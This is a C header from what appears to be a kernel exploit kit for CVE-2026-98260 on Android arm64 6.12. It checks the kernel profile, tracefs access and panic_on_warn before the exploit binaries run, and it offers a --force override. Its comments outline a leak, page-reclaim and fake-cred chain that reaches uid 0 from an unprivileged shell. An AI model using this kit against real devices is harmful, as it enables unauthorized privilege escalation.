/*
 * CVE-2026-98260 vulnerability and environment pre-check.
 *
 * There is no non-destructive runtime probe for this bug: reaching the
 * vulnerable exit_itimers()/cleanup_timerqueue() path leaves a stale
 * timerqueue node behind, and reaping it is the destructive step.  The gate
 * is therefore profile-based.  It accepts the exact profiles in
 * kernel_profile.h and refuses everything else unless --force (or
 * CVE98260_FORCE=1) is given.  Exploit binaries still need an exact profile;
 * --force only relaxes the environment checks.
 *
 * exp.c and uid0.c additionally need tracefs and kmem events for the leak
 * and page-reclaim stage.  exp.c's fake-cred chain triggers a WARN on its
 * first erase, so it also requires panic_on_warn=0.
 *
 * The header is self-contained: poc.c, exp.c and uid0.c include it directly
 * and each binary remains a standalone source file.
 *
 * Add a verified profile only after testing the exploit on it.  An adapted
 * profile may be added while runtime validation is pending, but it must be
 * marked verified=0 in kernel_profile.h and reported as such.
 */
#ifndef CVE98260_VULN_PRECHECK_H
#define CVE98260_VULN_PRECHECK_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>

#include "kernel_profile.h"

#define CVE98260_TRACEFS "/sys/kernel/tracing"

/* Returned by vuln_precheck() for --check: the caller exits without running. */
#define CVE98260_PRECHECK_EXIT_OK   100
#define CVE98260_PRECHECK_EXIT_FAIL 101

static int cve98260_flag(int argc, char **argv, const char *flag)
{
    int i;

    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], flag))
            return 1;
    }
    return 0;
}

static int cve98260_force(int argc, char **argv)
{
    const char *env = getenv("CVE98260_FORCE");

    if (env && *env && strcmp(env, "0"))
        return 1;
    return cve98260_flag(argc, argv, "--force");
}

static int cve98260_exists(const char *path)
{
    return access(path, F_OK) == 0;
}

static int cve98260_readable(const char *path)
{
    return access(path, R_OK) == 0;
}

static int cve98260_writable(const char *path)
{
    return access(path, W_OK) == 0;
}

static int cve98260_read_int(const char *path)
{
    FILE *f = fopen(path, "r");
    int v = -1;

    if (!f)
        return -1;
    if (fscanf(f, "%d", &v) != 1)
        v = -1;
    fclose(f);
    return v;
}

/*
 * Returns 0 to continue, 2 to refuse, or one of the CVE98260_PRECHECK_EXIT_*
 * codes when --check was passed (the caller exits 0 or 2 accordingly).
 */
static int vuln_precheck(const char *who, int argc, char **argv,
                         int need_tracefs, int fake_cred_chain)
{
    struct utsname u;
    const char *release = "?";
    const char *machine = "?";
    const char *build = "?";
    const char *verdict;
    long page = sysconf(_SC_PAGESIZE);
    int force = cve98260_force(argc, argv);
    int check_only = cve98260_flag(argc, argv, "--check");
    int known = 0;
    int candidate = 0;
    int blocked = 0;
    int ok;

    cve98260_active_profile = cve98260_profile_select();
    known = cve98260_active_profile != NULL;

    if (uname(&u) == 0) {
        release = u.release;
        machine = u.machine;
        build = u.version;
    }
    if (!known && strstr(release, "android16") && strstr(release, "6.12."))
        candidate = 1;

    printf("[precheck] %s: release=%s machine=%s page=%ld uid=%d euid=%d\n",
           who, release, machine, page, (int)getuid(), (int)geteuid());
    printf("[precheck] build: %s\n", build);
    printf("[precheck] profile: %s\n",
           known ? cve98260_active_profile->label :
           candidate ? "candidate android16-6.12, vulnerability not confirmed" :
           "unknown, vulnerability not confirmed");

    if (strcmp(machine, "aarch64") && strcmp(machine, "arm64")) {
        printf("[precheck] unsupported machine: this chain is arm64-only\n");
        blocked = 1;
    }
    if (page != 4096) {
        printf("[precheck] unsupported page size %ld: this chain assumes 4 KiB pages\n",
               page);
        blocked = 1;
    }
    if (geteuid() == 0)
        printf("[precheck] warning: euid is 0; the tested condition is an unprivileged shell\n");

    if (need_tracefs) {
        int events = cve98260_exists(CVE98260_TRACEFS "/events/kmem");
        int pipe = cve98260_readable(CVE98260_TRACEFS "/per_cpu/cpu0/trace_pipe_raw");
        int trigger = cve98260_writable(CVE98260_TRACEFS "/events/kmem/rss_stat/trigger");
        int on = cve98260_writable(CVE98260_TRACEFS "/tracing_on");

        printf("[precheck] tracefs: kmem=%s trace_pipe_raw=%s trigger=%s tracing_on=%s\n",
               events ? "ok" : "no", pipe ? "ok" : "no",
               trigger ? "ok" : "no", on ? "ok" : "no");
        if (!events || !pipe || !trigger || !on) {
            printf("[precheck] tracefs is not usable for the leak/reclaim stage\n");
            blocked = 1;
        }
    }

    if (fake_cred_chain) {
        int v = cve98260_read_int("/proc/sys/kernel/panic_on_warn");

        if (v < 0) {
            if (known) {
                printf("[precheck] panic_on_warn: unreadable; 6.12.38 was "
                       "validated with 0, assuming 0 for this profile\n");
            } else {
                printf("[precheck] panic_on_warn: unreadable; cannot confirm it for "
                       "an unknown profile\n");
                blocked = 1;
            }
        } else {
            printf("[precheck] panic_on_warn=%d\n", v);
            if (v != 0) {
                printf("[precheck] the fake-cred chain triggers a WARN; "
                       "panic_on_warn must be 0\n");
                blocked = 1;
            }
        }
    }

    if (known && !blocked) {
        static char vbuf[128];

        snprintf(vbuf, sizeof(vbuf), "profile match: %s",
                 cve98260_active_profile->label);
        verdict = vbuf;
        ok = 1;
    } else if (known) {
        verdict = "known profile but environment check failed";
        ok = force;
    } else if (force) {
        verdict = "unconfirmed release, forced";
        ok = 1;
    } else {
        verdict = "cannot confirm the vulnerability";
        ok = 0;
    }

    printf("[precheck] verdict: %s\n", verdict);
    if (ok && (blocked || !known))
        printf("[precheck] --force: proceeding despite the failed check\n");

    if (check_only) {
        printf("[precheck] --check: %s\n", ok ? "would proceed" : "would refuse");
        fflush(stdout);
        return ok ? CVE98260_PRECHECK_EXIT_OK : CVE98260_PRECHECK_EXIT_FAIL;
    }
    if (!ok) {
        printf("[precheck] refusing to run; verify the kernel first and rerun with "
               "--force (or CVE98260_FORCE=1)\n");
        fflush(stdout);
        return 2;
    }
    fflush(stdout);
    return 0;
}

#endif /* CVE98260_VULN_PRECHECK_H */
